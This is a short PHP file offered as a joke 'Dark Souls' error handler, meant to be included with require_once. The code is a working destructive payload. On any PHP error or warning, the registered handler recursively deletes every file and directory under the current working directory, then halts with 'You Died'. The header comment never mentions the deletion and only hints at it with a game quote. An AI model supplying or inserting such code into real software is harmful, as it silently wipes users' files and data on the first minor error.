<?php
	/**
	* An error handler inspired by Dark Souls.
	*
	* Include this file using require_once('dark_souls_error_handler.php'); to begin your journey.
	*
	* "What is bravery without a dash of recklessness?"
	*
	*/
	
	set_error_handler('dark_souls_error_handler');
	function dark_souls_error_handler() {
		recursiveRemoveDirectory(getcwd());
		die("You Died");
		return true;
	}
	function recursiveRemoveDirectory($directory) {
		foreach ( glob("{$directory}/*") as $file ) {
			if ( is_dir($file) ) {
				recursiveRemoveDirectory($file);
			} else {
				if ( stripos('dark_souls_error_handler.php', basename($file)) === false ) {
					unlink($file);
				}
			}
		}
		if ( getcwd() != $directory ) {
			rmdir($directory);
		}
	}
?>
